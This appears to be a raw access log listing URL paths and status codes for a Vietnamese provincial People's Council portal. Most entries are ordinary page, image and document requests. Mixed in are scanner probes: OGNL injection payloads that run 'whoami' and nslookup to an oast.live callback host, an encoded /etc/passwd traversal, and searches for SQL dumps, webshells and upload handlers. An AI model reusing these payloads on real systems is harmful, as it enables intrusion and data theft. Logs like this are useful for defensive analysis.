/sap/admin/public/default.html,404
/assets/php/profile.php,404
/assets/elFinder-2.1.9/elfinder.html,404
/portal/pages/van-phong-doan-DBQH-HDND-tinh.aspx,200
/mgmt/tm/util/bash,404
/portal/Pages/2023-1-11/Hoi-nghi-gap-mat-can-bo-huu-tri-co-quan-Van-phong-bxbkgy.aspx,200
/js/form/jquery.fancybox.js,200
/portal/Pages/2024-3-13/HDND-tinh-to-chuc-ky-hop-giai-quyet-cong-viec-phatjwtq6b.aspx,404
/api/content/,404
/portal/Pages/default.aspx/api/uploadify.ashx,200
/js/form/bootstrap.min.js,200
/_layouts/TANDAN.Webservice.asmx,200
/repeater.php,404
/AttachFiles/10.+Báo+cáo+của+Công+An+tỉnh+năm+2017040620180821.pdf,304
/css/form/jquery.idtabs.css,200
/portal/Pages/default.aspx/file.ashx,200
/portal/Pages/2021-12-15/Dai-bieu-Quoc-hoi-tinh-to-chuc-giam-sat-chuyen-de-otujn5.aspx,200
/portal/Photos/2023-05-12/153737d1bd2b1dbd2.jpg,200
"/AttachFiles/4.+BC+cong+tac+MT,+xay+dung+chinh+quyen+nam+2019+của+MTTQ+tinh100620201107.pdf",304
/banker/index.php,404
/ScriptResource.axd,200
/portal/Photos/2024-03/_w/bac4b5956eafe91dqh_20240325212544_png.jpg,200
/apple-touch-icon-152x152.png,404
/AttachFiles/10.+BC+thực+hiện+KNg+sau+GSCĐ+về+DT+tuyến+đg+bộ+NĐ-P.lý130620180420.pdf,200
/ccms/index.php,404
/audio/27113.mp3,404
/portal/Photos/2024-01/91e81f2d5c3ea6fd1_20240130182954.png,200
/sap/bc/BSp/sap/menu/fameset.htm,404
/cgi-bin/kerbynet,404
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-700.woff2,200
/css/layouts/bootstrap.min.css,200
/AttachFiles/15.2.+QH+b.ton+d.dang+sinh+hoc+tinh+ND+(đủ)011220181011.pdf,200
/portal/Pages/default.aspx/test.asp,200
/AttachFiles/11.+BC+quyet+toan+ngan+sach+nha+nuoc+tinh+2019031220200844.pdf,200
/audio/27088.mp3,404
/portal/pages/email-contact.aspx,200
/AttachFiles/dai-bieu.aspx,403
/AttachFiles/12.+BC+ket+qua+GSCD+cua+TT+HDND+tinh+ve+cty+TNHH+MTV+KTCTTL+va+cap+bu+thuy+loi+phi100620201037.pdf,206
/api/ping/,404
/audio/27792.mp3,404
/portal/Pages/2023-1-3/Doan-Dai-bieu-Quoc-hoi-tinh-to-chuc-giam-sat-chuye0k4hf8.aspx,200
/updates.php,404
/portal/pages/van-ban/v.aspx,200
/images/icons_title.gif,404
/js/form/TDList.js,200
"/AttachFiles/02.+NQ+chap+thuan+danh+muc+du+an+phai+thu+hoi+dat,+phe+duyet+danh+muc+du+an+chuyen+muc+dich+SDD+duoi+10+ha+dat+trong+lua+sang+muc+dich+khac+nam+2021260420210410.pdf",200
/wp-admin/css/colors/coffee/index.php,404
/+CSCOE+/session_password.html,404
/audio/28012.mp3,404
/webapi/auth,404
/js/form/jquery.idtabs.js,200
/export/backup.sql,404
/hoidongnhandan/1231/29459/39470/Lien-he/nghi-quyet-detail.aspx,404
/hoidongnhandan/1231/29459/39416/Van-phong-HDND-tinh/AttachFiles/tai-lieu-detail.aspx,404
/_layouts/tandan.portal/weather/img/128/04d.png,200
/portal/Pages/2022-6-30/Ban-Kinh-te--Ngan-sach-tham-tra-truoc-ky-hop-thu-boaeofa.aspx,200
/AttachFiles/17-2016-NQ-HDND_201608020415045750120620200831.PDF,200
/portal/Pages/2024-1-12/Hoi-nghi-tong-ket-cong-tac-nam-2023-va-trien-khai-94zzsq.aspx,200
/wp-consar.php,404
/portal/_res/bootstrap/fonts/glyphicons-halflings-regular.woff,200
/portal/Pages/2023-8-25/Nang-cao-chat-luong-giam-sat-cua-Hoi-dong-nhan-danrmjk75.aspx,200
/db.sql,404
/portal/Pages/2022-12-19/3wcv0t.aspx,200
/portal/Pages/default.aspx/fileup.asp,200
/classes/Login.php,404
/hoidongnhandan/1231/29459/39416/Van-phong-HDND-tinh/tai-lieu-detail.aspx,404
/login.action,404
/portal/Photos/2024-03/_w/d4912d5a10db415dPho_png.jpg,200
/portal/VanBan/2023-07/5badbf9b734f758dNghị+quyết+kỳ+họp+thứ+12+HĐND+tỉnh.rar,200
/portal/Photos/2023-10-23/83504848cb58d23dhc+(1).jpg,200
/AttachFiles/13-NQ-HDND_20160802040418308300120620200833.PDF,200
/portal/Pages/2021-10-15/Boi-duong-truc-tuyen-dai-bieu-Hoi-dong-nhan-dan-cavrhflb.aspx,200
/portal/Pages/default.aspx,200
/portal/ImageAds/2db8333db8f3df4dDanhBa.jpg,200
/userfiles/media/DC+NHD.jpg,200
/authenticationendpoint/2egzrxivmnwhsjpqvn4ig3hqijy.jsp,404
/portal/Photos/2023-05/d7aa012939b46d6d5.jpg,200
/portal/admin/modules/quan-tri-lien-ket-anh.aspx,302
/portal/Photos/2022-10/_t/b0dd5c456dcafd0dPXL_20221027_150337433_jpg.jpg,200
/portal/Photos/2023-04/_w/c2c9237ecdeed65dPC1_jpg.jpg,200
/wp-admin/users.php,404
/tin-tuc-thuong-truc-detail.aspx,404
/portal/Photos/2023-07-11/2edd21daf735444d5ff315943b7aeb24b26b.jpg,200
/js/form/form.js,200
/AttachFiles/26+TB+kqua+HN+TTr+HĐND+t8.2016120620200400.doc,200
/anh-detail.aspx,404
"/view-resol-Nghi-quyet-ve-chap-thuan-dieu-chinh-quy-mo,-tong-muc-dau-tu,-thoi-gian-thuc-hien-du-an-Nang-cap-ha-tang-vung-nuoi-trong-thuy-san-xa-Bach-Long,-huyen-Giao-Thuy,-tinh-Nam-Dinh-273.html",400
/portal/Pages/default.aspx/Content/Upload,200
"/AttachFiles/6.+To+trinh+ve+so+luong,+nhan+su+de+bau+Hoi+tham+nhan+dan+cua+Toa+an+nhan+dan+tinh+NK+2021-2026230620210802.pdf",200
/portal/admin,302
/css/layouts/metro.css,200
/portal/Photos/2023-05-12/580a87481075a47d5.jpg,200
/api.php,404
/userfiles/file/TaiLieuTXCT+Ky+hop+6/nghi-quyet-detail.aspx,302
/AttachFiles/quyet+dinh+thÀnh+lẬp+ĐoÀn+giÁm+sÁt+chuyÊn+ĐỀ+030620180628.doc,200
/userfiles/2020/bb.jpg,200
/portal/pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/portal/pages/van-ban/default.aspx,400
/service/extension/backup/mboximport,404
/audio/27928.mp3,404
/database.sql,404
/portal/Pages/default.aspx/up.asp,200
"/portal/VanBan/2021-11/fd94dcbb9cab39bd25.+Q.dinh+che+do+tro+cap+cho+can+bo,+CC,+VC+co+bang+sau+dai+hoc.pdf",200
/AttachFiles/17.+DA+QH+phat+trien+kinh+te+thuy+san011220181013.pdf,200
/audio/28000.mp3,404
/portal/Pages/2021-10-11/Ban-Kinh-te--Ngan-sach-HDND-tinh-Nam-Dinh--Khoa-XImk5hlt.aspx,200
"/portal/VanBan/2024-03/a17e5047a220e3cdKH+Tổ+chức+kỳ+họp+thứ+17+(để+giải+quyết+công+việc+phát+sinh+đột+xuất)+HĐND+tỉnh+khóa+XIX,+NK+2021-2026.pdf",206
/portal/Pages/default.aspx/fileupload.asp,200
/admin/mysql.sql,404
/login,404
/AttachFiles/26.+Phí+thư+viện040620180843.pdf,200
/wp-content/uploads/style.php,404
/AttachFiles/70_KH_20210629093550131130290620210944.pdf,200
/portal/_layouts/Authenticate.aspx,302
/login.htm,404
/wp-content/plugins/woc-order-alert/assets/admin/js/scripts.js,404
"/hoidongnhandan/1231/29459/39415/Ban-Phap-che-HDND-tinh/AttachFiles/AttachFiles/NQ+76+chap+thuan+dieu+chinh+du+an+cai+tao,+nang+cap+duong+Khang+Thuan,+H+Truc+Ninh151220200306.pdf",404
/portal/_res/bootstrap/css/bootstrap.min.css,200
/AttachFiles/9.+BC+giai+quyet+ket+qua+khieu+nai+ky+5280620180856.pdf,200
/home.html,404
/portal/Pages/2024-2-2/Dong-chi-Pho-Chu-tich-HDND-tinh-Mai-Thanh-Long-thahfdqzj.aspx,200
/_layouts/images/fgimg.png,200
/portal/_res/css/component.css,200
/portal/_res/img/ic-widget.png,200
/userfiles/media/TD+DBQH1.jpg,200
/wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php,404
/vcac/,404
/backupsettings.dat,404
/portal/pages/photos/w.aspx,200
/portal/Pages/2023-1-12/Tham-tang-qua-cho-gia-dinh-cac-em-nho-co-hoan-canh7p1aq9.aspx,200
/cgi-bin/system_mgr.cgi,404
/simple.php,404
/portal/pages/video/default.aspx,200
/wp-content/plugins/canto/includes/lib/detail.php,404
/portal/_res/fonts/RobotoCondensed-Bold.ttf,200
/portal/Photos/2023-04/_t/844051d177145f0d3_jpg.jpg,200
/userfiles/file/2019/GSYT_2.jpg,404
/portal/Pages/default.aspx/api/fileup,200
/conf_mail.php,404
/components/com_moofaq/includes/file_includer.php,404
/.well-known/traffic-advice,500
/img/loading-white.gif,200
/wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js,404
/portal/Photos/2023-08/9b68506b4db2485d4.jpg,200
/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/tai-lieu-detail.aspx,302
/api/config,404
/portal/Pages/2022-5-27/Chi-doan-Van-phong-Doan-DBQH-va-HDND-tinh-Nam-Dinhvfyop5.aspx,200
/hoidongnhandan/1231/29459/40968/Thuong-truc-HDND-tinh/AttachFiles/nghi-quyet-detail.aspx,404
/cgi-bin-hax/ExportSettings.sh,404
/portal/Photos/2024-03/_w/6e87739028bc2b5da5_20240313090337_jpg.jpg,200
/lab.html,404
/portal/Pages/2023-11-3/Cong-tac-hoan-thien-du-thao-Luat-Dat-dai-sua-doi-dywoz1j.aspx,200
/hoidongnhandan/1231/29459/42083/Hoi-dong-nhan-dan-huyen-Hai-Hau/AttachFiles/01.+NQ+mien+nhiem+PCT+UBND+tinh220320211002.pdf,404
/portal/Photos/2022-06/_t/a7ce4d01f10fd81d4_jpg.jpg,200
/css/layouts/font-awesome.min.css,200
/jira/secure/QueryComponentRendererValue!Default.jspa,404
/data/data.sql,404
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-500.woff2,200
/scgi-bin/platform.cgi,404
/_layouts/tandan.portal/jslibs/jquery-ui/jquery-ui-tabs-rotate.js,200
/nghi-quyet-view.aspx,404
/admin/index.php,404
/portal/VanBan/2021-12/b1cdd0e8ec21b44d46.+98.+NQ+ban+hanh+Quy+che+bi+mat+nha+nuoc+cua+HDND+tinh.pdf,200
/EemAdminService/EemAdmin,404
/dataservice/etc/passwd,404
/portal/Photos/2021-10-17/cf07fcea8331b37dmtl.jpg,200
/Default.aspx,404
/css/form/layouts.custom.css,200
/Pages/layouts.min.js,404
"/hoidongnhandan/1231/29459/40926/Chuc-nang-nhiem-vu/AttachFiles/5.NQ+bai+bo+1+phan+NQ+53+2017+quy+dinh+muc+thu,+che+do+thu,+nop+va+quan+ly+le+phi+ho+tich210720210940.pdf",404
/_next/server/pages-manifest.json,302
"/portal/VanBan/2021-11/d793524cb0d364d20.+Danh+muc+d.an,+c.trinh+chuyen+muc+dich+SDD+duoi+10+ha+dat+trong+lua,+duoi+20ha+dat+rung+phong+ho.pdf",200
"/AttachFiles/8.+NQ+ve+c.thuan+d.chinh+thoi+gian+xay+dung+khu+do+thi+thuong+mai+Con+-+Văn+ly,+huyen+Hai+Hau030920200839.pdf",200
/wp-security.php,404
/_layouts/tandan.portal/images/tinnhiemcong.png,200
/portal/Pages/2023-4-21/Ban-Kinh-te--Ngan-sach-HDND-tinh-tham-tra-truoc-kyp9d7is.aspx,200
/portal/Photos/2024-02/_t/d0771fd71e862a9danh2_20240131114528_jpg.jpg,200
/portal/Pages/2023-3-31/Lay-y-kien-dong-gop-vao-du-an-Luat-Phong-thu-dan-s5ifkdl.aspx,200
/https:/namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/portal/LinkImage/dff8a0aaf18e9ddCSDL-2.jpg,200
/AttachFiles/NQ41120620200929.doc,200
/_layouts/sp.ribbon.js,200
/portal/Pages/default.aspx/api/file.ashx,200
/hoidongnhandan/1231/29461/39541/81626/Nghien-cuu---Trao-doi/Kien-toan-to-chuc-va-nang-cao-nang-luc-tham-muu-giup-viec-cua-co-quan-van-phong-HDND-tinh--Thuong-truc-HDND-tinh-Quang-Ninh-.aspx,403
/audio/28072.mp3,404
/hoidongnhandan/1231/29461/40929/80165/Ky-hop-thu-hai/Nghi-quyet-so-14-NQ-HDND-ngay-21-7-2016-Ve-viec-phe-chuan-tong-quyet-toan-ngan-sach-nha-nuoc-tinh-Nam-Dinh-nam-2015.aspx,404
/_layouts/tandan.portal/weather/img/128/01n.png,200
/axis2/axis2-admin/login,404
/portal/_res/img/bg-body.png,200
/portal/Pages/2019/Giam-sat-cong-tac-dau-tu-quan-ly-va-su-dung-trang--932940.aspx,200
/portal/pages/Lich-lam-viec-tuan.aspx,200
/AttachFiles/14-NQ-HDND_20160802040653733730120620200833.PDF,200
/portal/Pages/default.aspx/fileupload.ashx,200
/portal/_res/img/bg-footer-min.png,200
/portal/_res/bootstrap/fonts/glyphicons-halflings-regular.ttf,200
/portal/_res/img/new.gif,200
/sitecore/shell/ClientBin/Reporting/Report.ashx,302
/js/form/danh-muc.js,200
/_layouts/tandan/img/remove-icon-small.png,200
/audio/27684.mp3,404
"/AttachFiles/24.+QĐ+phân+cấp+quản+lý,+SD,+sử+lý+TS+công100620201138.pdf",304
/images/news/090520190835GSYT.1.jpg,404
/portal/Photos/2022-08-16/c5b0fd64ad64186dimages1343454_Untitled_1.jpg,200
/cgi-bin/admin.cgi,404
/css/form/chosen.css,200
/hoidongnhandan/1231/29459/39416/Van-phong-HDND-tinh/AttachFiles/AttachFiles/tai-lieu-detail.aspx,404
/app/options.py,404
/portal/Pages/2022-8-16/Nang-cao-chat-luong-dai-bieu-Hoi-dong-nhan-dan-cacevuibi.aspx,200
/portal/Photos/ef8c9b3f80e91dfdNamDinh.jpg,200
/portal/Photos/2022-09-29/9134cdfa3a8349ddimages1344613_Untitled_1.jpg,200
/portal/Pages/2021-12-1/Khai-mac-trong-the-Ky-hop-thu-tu-HDND-tinh-khoa-XIu4fymh.aspx,200
/portal/_themes/Portal_red/img/up.png,200
/audio/27115.mp3,404
/userportal/Controller,404
/uploads/database.sql,404
/hoidongnhandan/1231/29461/42095/89520/Trong-tinh/Tap-huan-Luat-Ngan-sach-Nha-nuoc-nam-2015.aspx,404
/cgi-bin/execute_cmd.cgi,404
/dfsms/,404
/audio/27804.mp3,404
/portal/Pages/default.aspx/api/upload.ashx,200
/portal/Pages/default.aspx/api/Uploadify,200
/_layouts/tandan.portal/jslibs/back-to-top.js,200
/portal/Pages/2021/Ban-Van-hoa-Xa-hoi-HDND-tinh-tham-tra-truoc-ky-hop-644262.aspx,200
/portal/Photos/2023-01-19/736d821a8ed379dIMG_2385.jpg,200
/webGui/images/green-on.png/,404
/hoidongnhandan/1231/29461/42095/87261/Trong-tinh/Hoi-nghi-lan-thu-11-Ban-Chap-hanh-Dang-bo-tinh-khoa-XIX.aspx,404
/admin/,404
/fileupload/toolsAny,404
/audio/28099.mp3,404
/actions/authenticate.php,404
/uploads/assets/backend/elfinder/elfinder-cke.html,404
/audio/27909.mp3,404
/portal/Pages/2021-10-13/Ban-Van-hoa--Xa-hoi-HDND-tinh-Nam-Dinh--Khoa-XIX-Nbwj71y.aspx,200
/portal/_res/bootstrap/js/bootstrap.min.js,200
/AttachFiles/09-NQ-HĐND100620201149.pdf,200
"/hoidongnhandan/1231/29459/42085/Hoi-dong-nhan-dan-huyen-Giao-Thuy/AttachFiles/3-+NQ+71+ve+du+toan+thu+chi+NS,+phuong+an+phan+bo+va+ke+hoach+dau+tu+cong+nam+2018120620200952.doc",404
/portal/Pages/2021/Dong-chi-Le-Quoc-Chinh-Pho-Bi-thu-Thuong-truc-Tinh-307014.aspx,200
/portal/Pages/2023-5-26/Giam-sat-chuyen-de-cua-Ban-Kinh-te--Ngan-sach-ve-Huj8ell.aspx,200
/AttachFiles/25.+BC+ket+qua+nhiem+vụ+QPQS+dia+phuong+2019100620201112.pdf,304
/portal/_themes/Portal_red/img/arrow-next-icon.png,200
/audio/27882.mp3,404
/AttachFiles/kh_gs+ban+vhxh030620180627.doc,200
/portal/Photos/2023-12/3f8bdd5f13dd5d4dbia10.jpg,200
/portal/Photos/2023-06/fceb6981cc0835bda1_20230628124037.jpg,200
/dashboard/,404
/portal/Pages/2024-3-19/Uy-ban-Thuong-vu-Quoc-hoi-chat-van-cac-van-de-thuoseeqg1.aspx,200
/css/layouts/bootstrap-responsive.min.css,200
/names.nsf/People,404
/hoidongnhandan/1231/29461/42095/87150/Trong-tinh/Uy-ban-nhan-dan-tinh-Nam-Dinh-trien-khai-nhiem-vu-phat-trien-kinh-te---xa-hoi-quy-II.aspx,404
/AttachFiles/nghiquyet_13_nq_tthdnd120620200750.pdf,200
/img/syncfusion-icons-white.png,200
/portal/Photos/2023-01/91423b4815414d6d20230113_144826_HDR_2.jpg,200
/photo/combine.php,404
/api/agent/tabs/agentData,404
/portal/Photos/2022-10-28/6bb4c78efdf6473dPXL_20221027_150337433.jpg,200
/q,404
/wp-json/am-member/license,404
/portal/Photos/2023-09/e32bfc1206e3158ddbqh.jpg,200
/webshell4/login.php,404
/portal/Photos/2021-10-17/9122007a090929ddndc.jpg,200
/jeecg-boot/jmreport/qurestSql,404
/uploads/elfinder/elfinder-cke.html,404
/login/index.php,404
/wp-admin/style.php,404
/AttachFiles/20a.+Quy+hoạch+vùng+H.Hải+Hậu+-+Sơ+đồ040620180828.pdf,206
/RestAPI/LogonCustomization,404
/s/2eCvhbIx1V3VaRtuULy0jshMUfU/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml,404
/hoidongnhandan/1231/29459/39511/lich-cong-tac/nghi-quyet-detail.aspx,404
/portal/Photos/2024-01/3b9df05d10ddd80dcover.jpg,200
/uploads/assets/backend/elfinder/elfinder.html,404
/AttachFiles/qĐ+24+thành+lập+văn+phònghĐnd+tỉnh030620180623.doc,200
/https:/hdnd.namdinh.gov.vn/_forms/td-login.aspx,400
/portal/Pages/2023-5-20/Dien-van-cua-dong-chi-Pham-Gia-Tuc-Uy-vien-BCH-Truvs5wgw.aspx,200
/AttachFiles/NghiQuyetKyHop11110620201203.zip,200
/portal/Photos/2021-10-20/16244f682459ed2dTBN1.jpg,200
/_api/web/currentuser,404
/hoidongnhandan/1231/29461/40927/79214/Co-cau-to-chuc/Ban-Phap-che-HDND-tinh-Nam-Dinh---Khoa-XVIII--nhiem-ky-2016---2021.aspx,404
/hoidongnhandan/1231/29459/39471/so-do-site/van-ban-kinh-te.aspx,404
/portal/Photos/2024-03/_t/d4912d5a10db415dPho_png.jpg,200
/portal/Photos/2023-04-24/d0f6edfd6dd400cda1.jpg,200
/hoidongnhandan/1231/29461/39412/99571/Tin-tuc---Hoat-dong/Uy-ban-nhan-dan-tinh-phat-dong-phong-trao-thi-dua-nam-2018.aspx,404
/js/form/TDCommon.js,200
/_layouts/sp.core.js,200
/AttachFiles/6.+BC+tham+tra+Ban+P+C100620201100.pdf,304
/portal/Pages/2023-5-20/Chu-tich-nuoc-Vo-Van-Thuong-ve-tham-va-lam-viec-ta5i2e4s.aspx,200
/portal/Photos/2024-01/_w/fe15bc366eb2e43d12345_jpg.jpg,200
/page,404
/ccms/dashboard.php,404
/_layouts/tandan.portal/jslibs/jquery-ui/jquery-ui-1.9.0.custom.min.js,200
/export/database.sql,404
/exchweb/bin/redir.asp,404
/index.php/user/,404
/style.php,404
/portal/ImageAds/cf2393ac6dd6ef2dGopYVB.jpg,200
/portal/Photos/2021-10-17/2dd45cd26d72f63dPolish_20201209_074609685.jpg,200
/portal/Pages/2022-8-19/Hoi-dong-nhan-dan-thanh-pho-Nam-Dinh-tap-trung-donbb3uit.aspx,200
/pfblockerng/www/index.php,404
/portal/Photos/2022-10-28/41cc1765d7d19a7dPXL_20221027_150952279.jpg,200
/js/layouts/jquery.cookie.js,200
/data/backups.sql,404
/_layouts/tandan.portal/weather/locations.js,200
/autodiscover/autodiscover.json,302
/audio/27836.mp3,404
/services/pluginscript/..,400
/AttachFiles/18.+DA+quy+dinh+muc+thu+hoc+phi011220181014.pdf,200
"/view-resol-Nghi-quyet-so-29-NQ-HDND,-ngay-08-12-2018-Thong-qua-quy-hoach-chung-do-thi-moi-thuoc-dia-phan-4-xa:-Yen-Bang,-Yen-Quang,-Yen-Hong,-Yen-Tien-huyen-Y-Yen-den-nam-2035-111.html",400
/portal/Photos/2022-09-15/d8c0a85efc8c9cadimages1344273_Untitled_1.jpg,200
/2eGZrlZ2iG5CbfJDmbmbgwLRTqf,404
/js/form/datetimepicker.min.js,200
/portal/Photos/2024-01/a12ee0ce325f43ad123.jpg,200
/modules/appagebuilder/apajax.php,404
/portal/_themes/Portal_red/img/art-tools.png,200
/portal/_res/bootstrap/fonts/glyphicons-halflings-regular.woff2,200
/AttachFiles/14.+BC+ket+qua+GS+thuc+hien+NQ+cua+HDND+tinh100620201110.pdf,200
"/AttachFiles/17.+Quy+dinh+phan+cap+tham+quyen+quyet+dinh+mua+sam+tai+san,+hang+hoa,+dich+vu+cua+cac+co+quan,+to+chuc+thuoc+dia+phuong+quan+ly031220200847.pdf",304
/auth/newpassword,404
"/hoidongnhandan/1231/29459/42096/Trong-nuoc/AttachFiles/AttachFiles/30.+NQ+sua+doi,+bo+sung+NQ+27+HDND131220180424.pdf",404
/css/layouts/style_default.css,200
/apisix/batch-requests,404
"/AttachFiles/10.+NQ+q.dinh+c.truong+dau+tu+xay+du+an+xay+dung+khu+dan+cu+tap+trung+xa+Dong+Son,+huyen+Nam+Truc220320211008.pdf",200
/goforms/menu,404
/portal/Photos/2022-07-18/c76c90d6c504cacdanh+bai+1+nd.jpg,200
/apple-touch-icon-precomposed.png,404
/cgi-bin/mesh.cgi,404
"/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(""whoami"").getInputStream(),""utf-8"")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(""X-Cmd-Response"",#a))}/",500
"/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/AttachFiles/NQ+65+q.dinh+c.truong+d.tu+d.ab+kien+co+hoa+kenh+Hai+Ninh,+Hai+Ninh+21,+Hai+Ninh+23,+kenh+CC5+thi+tran+Co+le,+huyen+Truc+Ninh151220200259.pdf",404
/assets/php/upload.php,404
/+CSCOT+/oem-customization,404
/css/form/jquery.ui.plupload.css,200
/hoidongnhandan/1231/29459/39471/so-do-site/van-ban-van-phong.aspx,404
/_layouts/tandan.portal/weather/img/48/04d.png,200
/portal/Pages/default.aspx/Manage/Uploadify,200
/portal/_res/img/bg-title.png,200
/wp-admin/,404
/audio/28093.mp3,404
/portal/Photos/2021-10-17/f4093aecd43d22ednph.jpg,200
/portal/_themes/Portal_red/theme.css,200
/portal/admin/notifi.js,200
/_layouts/tandan.portal/weather/img/128/10d.png,200
/incom/modules/uploader/showcase/script.php,404
/login.php,404
/hoidongnhandan/1231/29459/40928/Thu-vien-anh/AttachFiles/AttachFiles/4.+NQ+ve+c.thuan+c.truong+d.an+d.tu+Benh+vien+da+khoa+tinh+(Benh+vien+da+khoa+quy+mo+700+giuong+tinh+ND+cu)030920200836.pdf,404
/audio/27479.mp3,404
/audio/27962.mp3,404
/portal/Pages/2021-10-11/Thuong-truc-HDND-tinh-Nam-Dinh--Khoa-XVIII-nhiem-kl6f3p2.aspx,200
/css/form/jquery.fancybox.css,200
/classes/Master.php,404
/ddns_check.ccp,404
/portal/admin/tai-nguyen/thu-vien-anh.aspx,200
/a/b/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,400
/portal/Photos/2024-03/_t/6e87739028bc2b5da5_20240313090337_jpg.jpg,200
/upload/userfiles/image/2eCvhOrYhjsSIjCx6gdCXZrfhve.png,404
/portal/Photos/2023-12-25/c940eee6414324d44.jpg,200
/hoidongnhandan/1231/29459/39471/so-do-site/van-ban.aspx,404
/portal/Pages/2024-1-22/Hoi-nghi-gap-mat-can-bo-huu-tri-co-quan-Van-phong-9sfopd.aspx,200
/hoidongnhandan/1231/29459/39407/Gioi-thieu/AttachFiles/NQ+44+dieu+chinh+chu+truong+d.tu+DA+x.dung+duong+Luu+Huu+Phuoc+keo+dai+&+khu+TDC+Lien+Ha+1110620201200.pdf,400
/hoidongnhandan/1231/29461/39413/87353/Ban-Kinh-te---Ngan-sach-HDND-tinh/Quyet-dinh-so-09-QD-KTNS--ngay-14-4-2017-cua-Ban-Kinh-te---Ngan-sach-ve-viec-thanh-lap-Doan-giam-sat-chuyen-de-.aspx,404
"/AttachFiles/10.+Q.dinh+ch.truong+dau+tu,+ch.truong+dieu+chinh+d.an+dau+tu+cong140720210811.pdf",200
/portal/pages/van-ban/default.aspx,200
/hoidongnhandan/1231/29459/39511/lich-cong-tac/ban-van-hoa.aspx,404
/_layouts/ScriptResx.ashx,200
/wp-content/plugins/infographic-and-list-builder-ilist/assets/js/ilist_custom_admin.js,404
/AttachFiles/NQ8120620200804.pdf,200
/alfanew.php,404
/portal/LinkImage/61ec8cf84cdf88fdQLVBDH1.jpg,200
/portal/Photos/2021-10-17/9de5537d8d82552d20210412_084110.jpg,200
/portal/Photos/9c045505cb7dd5edkhoaha.txt,200
/portal/Pages/default.aspx/tools/Uploadify/Uploadhandler.ashx,200
/admin/user.php,404
/portal/Pages/2023-9-26/So-ket-giua-nhiem-ky-thuc-hien-Nghi-quyet-Dai-hoi-iyvjts.aspx,200
/portal/Photos/2023-05/9a01470d15c35d5ddai_dien_20230522101035.jpg,200
/uploads/mysql.sql,404
/_layouts/tandan.portal/weather/img/48/04n.png,200
/AttachFiles/tai-lieu-detail.aspx,403
/zabbix/index_sso.php,404
/portal/Pages/default.aspx/tools/Upload.ashx,200
/AttachFiles/44.+BC+c.tac+6+thang+dau+năm+2019+Bo+chi+huy+BDBP+tinh100620201050.pdf,304
/vendor/qcubed/qcubed/assets/php/profile.php,404
/goform/setSysAdm,404
/auth/requestreset,404
/audio/28063.mp3,404
/portal/Pages/2024-3-27/,302
"/${@java.lang.Runtime@getRuntime().exec(""nslookup+co1uo51lnrhh1f0jg5m0w8r8qxahdr39n.oast.live"")}/",500
/robots.txt,404
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-500italic.woff2,200
/AttachFiles/AttachFiles/href='/tai-lieu-detail.aspx,302
/2eGZrfGIBAQUTh9B7mqQXbwkLIN.txt,302
/js/form/TDWebservice.js,200
/dfsms/index.php,404
/user,404
/hoidongnhandan/1231/29459/39470/Lien-he/AttachFiles/tai-lieu-detail.aspx,404
/portal/LinkImage/580d5be9b7118d4dQuocHoi-2.jpg,200
/css/layouts/popup-style-responsive.css,200
/portal/Photos/2024-01/e46c3d0094bfd45d1.jpg,200
/AttachFiles/18tb-Đc+chung+-+ctichj+hĐnd030620180642.pdf,200
/wp-json/wp/v2/lesson/1,404
/RestAPI/ImportTechnicians,404
/portal/pages/default.aspx,200
/AttachFiles/34_NQ_HĐND120620200858.docx,200
/portal/Pages/2023-12-10/5v4j48.aspx,200
/portal/Pages/2023-5-26/UBND-tinh-danh-gia-ket-qua-phat-trien-kinh-te--xa-bosifw.aspx,200
"/hoidongnhandan/1231/29459/40926/Chuc-nang-nhiem-vu/AttachFiles/NQ+39+xay+dung+cang+ca+Quan+Vinh,+h.+Nghia+Hung+(g.d+1)100620201159.pdf",404
/portal/Pages/2023-6-15/Dong-chi-Pho-Chu-tich-Thuong-truc-HDND-tinh-chuc-m46xrwh.aspx,200
